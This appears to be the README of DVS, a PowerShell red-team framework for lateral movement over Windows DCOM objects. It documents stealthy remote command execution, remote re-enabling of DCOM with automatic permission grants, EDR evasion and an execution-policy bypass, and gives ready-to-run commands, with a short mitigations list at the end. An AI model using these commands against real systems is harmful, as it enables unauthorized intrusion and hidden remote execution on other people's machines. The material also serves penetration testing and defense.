# D(COM) V(ulnerability) S(canner) AKA Devious swiss army knife - Lateral movement using DCOM Objects

Did you ever wonder how you can move laterally through internal networks. Interact with remote machines without alerting EDRs?  
Assuming we have valid credentials/active session with access to a remote machine, without executing a process remotely in a known,  
expected or a highly-monitored method (i.e. WMI, Task Scheduler, WinRM, PowerShell Remoting).  
For these scenarios, the DVS framework comes to the rescue.

The DVS framework is a swiss army knife which allows you to enumerate vulnerable functions of remote DCOM objects, launch them and even attack using them.  
The framework is being developed with a "Red Team" mindset and uses stealth methods to compromise remote machines.  
The DVS framework contains various ways to bypass remote hardening against DCOM by re-enableing DCOM access *remotely* and automatically grant the required
permissions to the attacking user.  
The framework can also revert changes on the remote machine to their original state, prior to the attack.

The huge idea, is that the tool can also execute commands using non-vulnerable DCOM objects using an incredible technique (Read below about Invoke-RegisterRemoteSchema)

*Compatible with PowerShell 2.0 and up*

**Youtube Video PoC**: [DVS](https://dvs.scorpiones.io)

## Disclaimer
This tool is for testing and educational purposes only. Any other usage for this code is not allowed. Use at your own risk.  
The author or any Internet provider bears NO responsibility for misuse of this tool.  
By using this you accept the fact that any damage caused by the use of this tool is your responsibility.

### Remote Registry access (MS-RRP) - how the DVS framework utilizes that protocol
* Remote Registry access
  1. Probe 445 port in order to interact with remote registry.
  2. Check if the remote-registry is enabled.
  3. Interact with remote registry.
  4. If AutoGrant mode is flagged, check write permissions. otherwise, check read permissions.
* Standard Registry Provider (*If remote-registry denied*)
  1. Probe 135 port in order to interact with Standard Registry Provider" using WMI.
  2. Check if the StdRegProv is accessible.
  3. Interact with Standard Registry Provider.
  4. If AutoGrant mode is flagged, check write permissions. otherwise, check read permissions.

### Why is this tool so stealthy?
The DVS tool first checks if principal-identity has access to the remote machine via the following steps:

* Basic actions
  1. Authentication operations (if NoAuth is not flagged).
     1. If credentials are provided, it creates a "net-only" session. otherwise, it will use the current-logged on session.
     2. Probe registry access.
  2. Check if DCOM feature is enabled.
  3. Allow DCOM Access (if AutoGrant flagged), otherwise fail.
  4. Check if the logged-on user/provided user and the groups the user is a member of (Via adsi/WindowsIdentity feature), are granted to interact with the DCOM (via remote registry queries).
  5. Grant permissions (if AutoGrant flagged), otherwise, fail.
  6. Resolve domain name from remote machine using NetBIOS over TCP, if it fails it will try using remote registry protocol (MS-RRP).

* Invoke-DCOMObjectScan
  1. Interact with DCOM objects.
  2. Enumerate the DCOM object and find vulnerable functions.
  3. Validate exploitation possibility.
  4. Generate execution payloads.
  5. Fetch personal information about the vulnerable DCOM object.

* Get-ExecutionCommand
  1. Generate execution payloads.

* Invoke-ExecutionCommand
  1. Try to interact with DCOM objects.
  2. Execute the commands.

* Invoke-RegisterRemoteSchema
  1. Try to interact with one of the following DCOM Objects:
     * InternetExplorer.Application - InternetExplorer COM Object
     * {D5E8041D-920F-45e9-B8FB-B1DEB82C6E5E} - Another COMObjects belongs to Internet Explorer
     * {C08AFD90-F2A1-11D1-8455-00A0C91F3880} - ShellBrowserWindow
     * {9BA05972-F6A8-11CF-A442-00A0C90A8F39} - ShellWindows
  2. Register remote schema (e.g. http://)
  3. Configure the schema to execute commands from the schema content
  4. Execute the command


### Tool components
* Security rights analyzer - Analyzing principal-identity rights to access the remote DCOM object.
* Remote grant access - Grants logged-on user permissions remotely (In case they were not already granted).
* DCOM Scanner - Scan and analyze remote/local DCOM objects for vulnerable functions that are provided (Patterns and function names must be specified).
  When the tool detects a vulnerable function, it will check what arguments the function includes and if the function has the ability to execute commands.
* DCOM command generator - Generates a PowerShell payload in order to execute on the remote machine.
* Report - Generates a CSV report with all the information about the vulnerable DCOM object.
* Command Execution - Execute commands through DCOM objects.

### Author
* [Nimrod Levy](https://twitter.com/el3ct71k)

### License
* GPL v3

### Checked Scenarios
* Out-of domain to domain
* From inside the domain to another domain-joined machine
* From domain to out-of-domain
* From current-session to another domain-joined machine

### Checked Operating Systems
* Windows 7 SP1
* Windows 8.1
* Windows 10
* Windows Server 2019


### Credits
* Thanks to [Rafel Ivgi](https://twitter.com/rafelivgi?lang=en) for mentoring, and helping with the architecture mindset of the tool.
* Thanks to [Yossi Sasi](https://github.com/yossisassi/) for helping me to optimize the script.

## Installation:

    git clone https://github.com/ScorpionesLabs/DVS
    powershell -ep bypass
    PS> Import-Module .\DVS.psm1
    PS> Get-Help Invoke-DCOMObjectScan -Detailed  # Get details of the Invoke-DCOMObjectScan command
    PS> Get-Help Get-ExecutionCommand -Detailed # Get details of the Get-ExecutionCommand command
    PS> Get-Help Invoke-ExecutionCommand -Detailed # Get details of the Invoke-ExecutionCommand command




#### Invoke-DCOMObjectScan

Invoke-DCOMObjectScan function allows you to scan DCOM objects and find vulnerable functions via a list of patterns or exact function names that you included in a file.
* Examples:
  1. Check whether the "MMC20.Application" (ProgID) object is accessible from the attacker machine to the "DC01" host without first querying and verifying the access list of the DCOM object.
     *Note:* -NoAuth is not eligible on type "All" due to the fact that it needs to interact with the registry of the remote machine.

            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -NoAuth -CheckAccessOnly -Verbose

  2. Validates whether the "MMC20.Application" (ProgID) is applicable through 10.211.55.4/24 ip addresses range. If exists, he tool will try to enumerate the information about it. (using the current logged-on user session).

            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -Hostlist "10.211.55.4/24" -CheckAccessOnly -Verbose

  3. Validates if the "{00020812-0000-0000-C000-000000000046}" CLSID object exists and accessible. If exists, the tool will enumerate the information about it. (By using lab\administrator credentials).

            PS> Invoke-DCOMObjectScan -Type Single -ObjectName "{00020812-0000-0000-C000-000000000046}" -HostList "10.211.55.4" -CheckAccessOnly -Username "lab\administrator" -Password "Aa123456!" -Verbose

  4. Scans all the objects stored on a specified path (e.g. "C:\Users\USERNAME\Desktop\DVS\objects.txt") and finds the function list located in the specified file like "vulnerable.txt" using the "lab\administrator" credentials with the _following configuration_:  
     *Max depth:* 4  
     *Max results:* 1 result for each object.  
     *AutoGrant mode:* If we don't have access to the object or if the DCOM feature is disabled, enable the DCOM feature and perform automatic grant to the relevant DCOM object.  
     Finally, revert the machine to the same state as before the attack.

            PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type List -ObjectListFile "C:\Users\USERNAME\Desktop\DVS\objects.txt"  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -AutoGrant -Username "lab\administrator" -Password "Aa123456!" -HostList "10.211.55.4" -MaxResults 1 -Verbose

  5. Scans all the objects stored on the remote machine and finds the functions located on the selected file (e.g. "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt").  
     *Force mode:* This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.  
     This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.  
     For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.

            PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -HostList "10.211.55.4" -Force -Verbose


#### Get-ExecutionCommand

Get-ExecutionCommand function allows to generate a PowerShell payload that will interact and execute with the remote DCOM function with the relevant parameters.
* Examples:
  1. Checks if the principal-identity is granted to interact with "{00020812-0000-0000-C000-000000000046}" CLSID object using lab\administrator credentials, then it will generates the execution command.

            PS> Get-ExecutionCommand -ObjectName "{00020812-0000-0000-C000-000000000046}" -ObjectPath "DDEInitiate" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -Verbose


  2. Checks for DCOM access,  
     In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grants identity access and interacts with "MMC20.Application" ProgID object using lab\administrator credentials, and will generates you the execution command.
     Finally, it will revert the machine to the same state as before the attack.

            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -AutoGrant -Verbose

  3. Tries to interact with "MMC20.Application" ProgID object using current logged-on session (Even the tool assumes that the user doesn't have access to the object),
     then it will generates the execution command.

            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -Force -Verbose

  4. Tries to interact with "MMC20.Application" ProgID object without checking principal-identity privileges

            PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -NoAuth -Verbose


#### Invoke-ExecutionCommand

Invoke-ExecutionCommand function executes commands via DCOM Object using the logged-on user or provided credentials.
* Examples:

  1. Checks for DCOM access,  
    In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grant access, Interact with MMC20.Application object using current logged-on user session and Execute the following commands:
     1. "cmd.exe /c calc"
     2. Frame.Top attribute to "1"
    Finally, revert the machine to the same state as before the attack.

            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -AutoGrant -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")},@{ObjectPath="Frame.Top";Arguments=@(1)} ) -Verbose -HostList 10.211.55.4

  2. Tries to interact with MMC20.Application object using lab\administrator credentials, and executes the following command: "cmd.exe /c calc".

            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -Verbose -HostList 10.211.55.4 -Username lab\administrator -Password Aa123456!

  3. Tries to interact with MMC20.Application object using current logged-on user session (Even the tool assumes that the user doesn't have an access to the object), and executes the following command: "cmd.exe /c calc".

            PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -Verbose -HostList 10.211.55.4 -Force

#### Invoke-RegisterRemoteSchema

Invoke-RegisterRemoteSchema function executes commands via one of the following objects object using the logged-on user or provided credentials:
* ShellBrowserWindow
* ShellWindows
* Internet Explorer
* ielowutil.exe

**Note:** These objects doesn't need access to local machine hive, it will proceed with the foothold with any user that can access the remote machine!

* Examples:
  1. Executes "cmd /c calc" command on 10.211.55.1/24 remote machine using the current logged-on session, and grant privileges if is needed

            PS> Invoke-RegisterRemoteSchema -HostList 10.211.55.1/24 -Command cmd /c "calc"

  2. Executes "cmd /c calc" command on 10.211.55.4 remote machine using the current logged-on session using provided credentials

            PS> Invoke-RegisterRemoteSchema -HostList 10.211.55.4 -Command "cmd /c calc" -Username Administrator -Password Aa123456!

## Future work
* Analyze and change firewall rules remotely

## Mitigations and Recommendations
* Disable remote DCOM access.
* Limit Remote-Registry/RPC access.
* Block DCOM protocol using firewall rules
* Monitor changes on the registry in the following locations: SOFTWARE\Microsoft\Ole, SOFTWARE\Classes.
